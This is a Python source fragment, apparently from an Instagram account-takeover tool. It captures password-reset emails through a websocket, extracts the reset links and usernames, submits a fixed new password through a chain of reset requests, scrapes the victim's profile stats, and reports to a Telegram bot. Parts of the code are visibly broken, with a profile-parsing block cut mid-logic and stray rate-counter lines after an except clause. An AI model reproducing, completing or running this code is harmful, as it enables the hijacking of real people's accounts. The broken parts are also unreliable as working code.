def send_telegram_media_local(token, chat_id, media_source, caption, reply_markup):
    if not token or not chat_id:
        return
    try:
        if media_source.startswith(('http://', 'https://')):
            url = f"https://api.telegram.org/bot{token}/sendVideo"
            params = {'chat_id': chat_id, 'video': media_source, 'caption': caption, 'parse_mode': 'HTML', 'reply_markup': json.dumps(reply_markup), 'supports_streaming': True}
            requests.get(url, params=params, timeout=15)
        else:
            if media_source.lower().endswith(('.gif')):
                url = f"https://api.telegram.org/bot{token}/sendAnimation"
                file_key = 'animation'
            else:
                url = f"https://api.telegram.org/bot{token}/sendPhoto"
                file_key = 'photo'
            
            with open(media_source, 'rb') as media_file:
                files = {file_key: media_file}
                data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'HTML', 'reply_markup': json.dumps(reply_markup)}
                requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.get(url, params={"chat_id": chat_id, "text": caption, "parse_mode": "HTML", "reply_markup": json.dumps(reply_markup)}, timeout=10)
        except:
            pass

def code2_extract_reset_link_from_email(message_text):
    patterns = [
        r'https://instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^&\s]+&[^"\s]+',
        r'https://instagram\.com/fxcal/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^"\s]+',
        r'https://www\.instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^&\s]+&[^"\s]+',
        r'https://instagram\.com/fxcal/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^"\s]+',
        r'https://instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+',
    ]
    for pattern in patterns:
        match = re.search(pattern, message_text)
        if match:
            return match.group(0)
    return None

def code2_extract_username_from_email(message_text):
    patterns = [
        r'Hi\s+([a-zA-Z0-9_\.]+)',
        r'intended for ([a-zA-Z0-9_\.]+)'
    ]
    for pattern in patterns:
        match = re.search(pattern, message_text)
        if match:
            return match.group(1)
    return None

def code2_full_password_change(reset_link, username_from_email):
    try:
        uidb36, token = code2_extract_tokens_from_link(reset_link)
        user_agent = code2_generate_user_agent()
        r1 = code2_request_1_password_reset(uidb36, token, user_agent)
        if r1.status_code != 200:
            return None, False
        r1_json = r1.json()
        user_id = r1_json.get("user_id")
        cni = r1_json.get("cni")
        nonce_code = r1_json.get("password_reset_nonce_code") or r1_json.get("nonce_code")
        challenge_context = r1_json.get("challenge_context")
        mid = r1.headers.get("Ig-Set-X-Mid", "")
        if not all([user_id, cni, nonce_code, challenge_context]):
            return None, False
        r2 = code2_request_2_challenge(user_id, cni, nonce_code, challenge_context, user_agent, mid)
        if r2.status_code != 200:
            return None, False
        new_challenge_context = challenge_context
        r3 = code2_request_3_submit_password(cni, new_challenge_context, NEW_PASSWORD, user_agent, mid)
        if r3.status_code == 500:
            return username_from_email, True
        return None, False
    except:
        return None, False
def code2_listen_and_process(email, expiry, email_hash):
    try:
        import websocket
    except ImportError:
        os.system(f"{sys.executable} -m pip install websocket-client --quiet")
        import websocket
    
    ws_token = f"{expiry}-{email}-{email_hash}"
    reset_link = None
    username = None
    
    def on_message(ws, message):
        nonlocal reset_link, username
        if message == "ping":
            ws.send("pong")
            return
        if username is None:
            extracted_user = code2_extract_username_from_email(message)
            if extracted_user:
                username = extracted_user
        if reset_link is None:
            extracted_link = code2_extract_reset_link_from_email(message)
            if extracted_link:
                reset_link = extracted_link
                ws.close()
    
    def on_error(ws, error):
        pass
    
    def on_close(ws, close_status_code, close_msg):
        pass
    
    def on_open(ws):
        ws.send(ws_token)
    
    ws = websocket.WebSocketApp(WEBSOCKET_URL, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close)
    ws.run_forever()
    
    if reset_link:
        final_username, success = code2_full_password_change(reset_link, username)
        if success:
            return final_username if final_username else username
    return None

def code3_get_profile_info(username):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(f'https://www.instagram.com/{username}/', 
                               headers=headers, 
                               timeout=10)
        
        with open(f"{username}_raw.txt", "w", encoding="utf-8") as f:
            f.write(response.text)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        title_tag = soup.find('meta', property='og:title')
        desc_tag = soup.find('meta', attrs={'name': 'description'})
        
        name = "N/A"
        posts = "0"
        followers = "0"
        following = "0"
        
        if title_tag and title_tag.get('content'):
            title = title_tag['content']
            if '(@' in title:
                name = title.split('(@')[0].strip()
        
        if desc_tag and desc_tag.get('content'):
            desc = desc_tag['content'].lower()
            
            posts_match = re.search(r'([\d,]+)\s*posts?', desc)

                following = following_match.group(1).replace(',', '')

    except:
        return "N/A", "0", "0", "0"

        elapsed = now - rps_time
        if elapsed > 0:
            with stats_lock:
                rps_value = rps_counter / elapsed
                rps_counter = 0
        rps_time = now
